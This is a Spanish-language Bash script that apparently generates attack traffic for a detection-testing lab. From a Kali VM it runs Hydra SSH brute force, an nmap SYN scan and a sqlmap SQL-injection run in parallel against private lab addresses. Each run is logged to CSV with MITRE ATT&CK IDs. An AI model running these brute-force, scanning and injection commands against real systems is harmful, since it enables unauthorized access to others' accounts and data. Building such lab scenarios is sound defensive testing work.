#!/usr/bin/env bash
# =============================================================================
# escenario2_ataques.sh — ESCENARIO 2: Ataques controlados, EN PARALELO
#
# DÓNDE EJECUTAR: en la VM KALI (192.168.30.20). Desde el host, con un solo
# comando, vía Gestion/Lab/ejecutar_ataques.ps1 (recomendado), o manualmente:
#
#   Get-Content Lab\escenario2_ataques.sh -Raw | vagrant ssh kali -c "sudo bash -s"
#
# DIFERENCIA con la versión anterior: los 3 ataques automatizables (fuerza
# bruta SSH, escaneo de puertos e inyección SQL) se lanzan los tres AL MISMO
# TIEMPO (en paralelo, como procesos en segundo plano), en vez de uno
# después del otro. Esto además genera una condición más realista: varias
# amenazas concurrentes, que es justo lo que el Escenario 3 evaluaba de
# forma manual -- aquí ya queda cubierto de forma automática en el propio
# Escenario 2.
#
# Cada ataque escribe su log en un archivo CSV separado para evitar que
# escrituras simultáneas corrompan un único archivo; al final se combinan.
# =============================================================================
set -uo pipefail

SSH_TARGET="192.168.10.10"
SSH_USER="vagrant"
SCAN_TARGET="192.168.10.0/24"
WEB_URL="http://192.168.10.10/login.html?user=1"
REPETICIONES="${1:-5}"

OUT_DIR="/tmp/escenario2_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$OUT_DIR"
LOG_SSH="${OUT_DIR}/ataques_ssh.csv"
LOG_SCAN="${OUT_DIR}/ataques_scan.csv"
LOG_SQLI="${OUT_DIR}/ataques_sqli.csv"
LOG_FINAL="/tmp/log_ataques.csv"

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'
info() { echo -e "${CYAN}[$(date '+%H:%M:%S')]${NC} $*"; }
ok()   { echo -e "${GREEN}[OK]${NC}   $*"; }
warn() { echo -e "${YELLOW}[WARN]${NC} $*"; }

echo "ataque,mitre_id,target_ip,inicio,fin,repeticion" > "$LOG_SSH"
echo "ataque,mitre_id,target_ip,inicio,fin,repeticion" > "$LOG_SCAN"
echo "ataque,mitre_id,target_ip,inicio,fin,repeticion" > "$LOG_SQLI"

echo ""
echo "════════════════════════════════════════════════════════════"
echo "  ESCENARIO 2 — Ataques controlados EN PARALELO (${REPETICIONES} reps c/u)"
echo "  Salida: ${OUT_DIR}"
echo "  Inicio: $(date)"
echo "════════════════════════════════════════════════════════════"

# Verificar/instalar herramientas
for tool in hydra nmap sqlmap; do
    command -v "$tool" &>/dev/null || { warn "Instalando $tool..."; apt-get install -y -qq "$tool" 2>/dev/null; }
done
ok "Herramientas verificadas."

WORDLIST="/usr/share/wordlists/rockyou.txt"
if [[ ! -f "$WORDLIST" ]]; then
    WORDLIST="/tmp/wordlist_lab.txt"
    printf "123456\npassword\nvagrant\nadmin\nletmein\nqwerty\nP@ssw0rd\nroot\n" > "$WORDLIST"
fi

# =============================================================================
# Función de cada ataque (se ejecutan las 3 como procesos en segundo plano)
# =============================================================================

run_ssh_bruteforce() {
    for i in $(seq 1 "$REPETICIONES"); do
        INICIO=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
        hydra -l "${SSH_USER}" -P "${WORDLIST}" -t 4 -f \
            "ssh://${SSH_TARGET}" -o "${OUT_DIR}/hydra_rep${i}.log" 2>/dev/null
        FIN=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
        echo "bruteforce_ssh,T1110.001,${SSH_TARGET},${INICIO},${FIN},${i}" >> "$LOG_SSH"
        sleep 8
    done
}

run_portscan() {
    for i in $(seq 1 "$REPETICIONES"); do
        INICIO=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
        nmap -sS -T4 --top-ports 1000 "${SCAN_TARGET}" \
            -oN "${OUT_DIR}/nmap_rep${i}.log" 2>/dev/null
        FIN=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
        echo "portscan,T1046,${SCAN_TARGET},${INICIO},${FIN},${i}" >> "$LOG_SCAN"
        sleep 12
    done
}

run_sqli() {
    for i in $(seq 1 "$REPETICIONES"); do
        INICIO=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
        sqlmap -u "${WEB_URL}" --batch --level=2 --risk=1 --random-agent --forms \
            --output-dir="${OUT_DIR}/sqlmap_rep${i}" 2>/dev/null
        FIN=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
        echo "sql_injection,T1190,${SSH_TARGET},${INICIO},${FIN},${i}" >> "$LOG_SQLI"
        sleep 8
    done
}

# =============================================================================
# Lanzar los 3 ataques EN PARALELO
# =============================================================================
info "Lanzando los 3 ataques en paralelo (SSH brute-force + port scan + SQLi)..."

run_ssh_bruteforce &  PID_SSH=$!
run_portscan &        PID_SCAN=$!
run_sqli &            PID_SQLI=$!

info "PIDs en ejecución: ssh=${PID_SSH} scan=${PID_SCAN} sqli=${PID_SQLI}"
info "Esperando a que terminen las ${REPETICIONES} repeticiones de cada uno..."

wait "$PID_SSH"  && ok "Fuerza bruta SSH completada."
wait "$PID_SCAN" && ok "Escaneo de puertos completado."
wait "$PID_SQLI" && ok "Inyección SQL completada."

# ---- Combinar los 3 CSV en uno solo, ordenado por hora de inicio ----------
{
    echo "ataque,mitre_id,target_ip,inicio,fin,repeticion"
    tail -n +2 "$LOG_SSH" "$LOG_SCAN" "$LOG_SQLI" -q 2>/dev/null
} | sort -t, -k4 > "$LOG_FINAL"

echo ""
echo "════════════════════════════════════════════════════════════"
echo -e "${YELLOW}  ATAQUES 4 y 5 — Requieren pasos manuales (ver guía):${NC}"
echo "  4) Pass-the-Hash (T1550.002)   -> DC Windows + Kali/crackmapexec"
echo "  5) Ejecución de Payload (T1059.001) -> Windows 10 + PowerShell"
echo "  Agregar cada uno a ${LOG_FINAL} con el mismo formato CSV."
echo "════════════════════════════════════════════════════════════"

TOTAL=$(( $(wc -l < "$LOG_FINAL") - 1 ))
echo ""
ok "ESCENARIO 2 completado. ${TOTAL} ataques automáticos registrados."
echo "  CSV combinado: ${LOG_FINAL}"
echo "  Logs detallados por ataque: ${OUT_DIR}/"
